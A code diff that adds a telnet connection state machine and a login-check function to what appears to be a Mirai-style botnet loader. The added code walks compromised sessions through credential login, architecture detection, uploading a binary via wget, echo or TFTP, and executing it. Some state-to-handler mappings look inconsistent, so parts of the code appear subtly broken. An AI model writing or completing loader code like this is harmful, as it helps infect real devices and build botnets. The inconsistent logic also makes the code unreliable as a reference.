@@ -7,6 +7,121 @@
 #include "binary.h"
 #include "util.h"
 
+/* Connection state machine handler */
+void connection_handler(struct connection *conn) {
+    switch (conn->state) {
+        case TELNET_CONNECTING:
+            /* Check if connection established */
+            {
+                int err = 0;
+                socklen_t err_len = sizeof(err);
+                getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
+                if (err != 0) {
+                    conn->srv->total_fails++;
+                    connection_close(conn);
+                    return;
+                }
+            }
+            conn->state = TELNET_READ_IACS;
+            connection_consume_iacs(conn);
+            break;
+
+        case TELNET_READ_IACS:
+            connection_consume_iacs(conn);
+            break;
+
+        case TELNET_USER_PROMPT:
+            connection_consume_login_prompt(conn);
+            break;
+
+        case TELNET_PASS_PROMPT:
+            connection_consume_password_prompt(conn);
+            break;
+
+        case TELNET_WAITPASS_PROMPT:
+            connection_consume_prompt(conn);
+            break;
+
+        case TELNET_CHECK_LOGIN:
+            connection_verify_login(conn);
+            break;
+
+        case TELNET_VERIFY_LOGIN:
+            connection_detect_arch(conn);
+            break;
+
+        case TELNET_READ_WRITEABLE:
+            connection_upload_wget(conn);
+            break;
+
+        case TELNET_COPY_ECHO:
+            connection_upload_echo(conn);
+            break;
+
+        case TELNET_DETECT_ARCH:
+            connection_detect_arch(conn);
+            break;
+
+        case TELNET_ARM_SUBTYPE:
+            connection_upload_wget(conn);
+            break;
+
+        case TELNET_UPLOAD_METHODS:
+            connection_upload_wget(conn);
+            break;
+
+        case TELNET_UPLOAD_ECHO:
+            connection_upload_echo(conn);
+            break;
+
+        case TELNET_UPLOAD_WGET:
+            connection_upload_wget(conn);
+            break;
+
+        case TELNET_UPLOAD_TFTP:
+            connection_upload_tftp(conn);
+            break;
+
+        case TELNET_RUN_BINARY:
+            connection_run_binary(conn);
+            break;
+
+        case TELNET_CLEANUP:
+            connection_close(conn);
+            break;
+
+        default:
+            connection_close(conn);
+            break;
+    }
+}
+
+/* Missing connection_consume_prompt function */
+void connection_consume_prompt(struct connection *conn) {
+    char buf[4096];
+    int n = recv(conn->fd, buf, sizeof(buf), 0);
+
+    if (n <= 0) {
+        conn->srv->total_fails++;
+        connection_close(conn);
+        return;
+    }
+
+    conn->last_recv = time(NULL);
+
+    /* Check for login failure */
+    if (util_stristr(buf, n, "error") || util_stristr(buf, n, "failed") ||
+        util_stristr(buf, n, "invalid") || util_stristr(buf, n, "incorrect")) {
+        conn->srv->total_fails++;
+        connection_close(conn);
+        return;
+    }
+
+    /* Login successful */
+    conn->srv->total_successes++;
+    conn->state = TELNET_VERIFY_LOGIN;
+}
+
 struct connection *connection_open(struct server *srv, int id, struct telnet_info *info) {
     struct connection *conn = calloc(1, sizeof(struct connection));
     if (conn == NULL) return NULL;
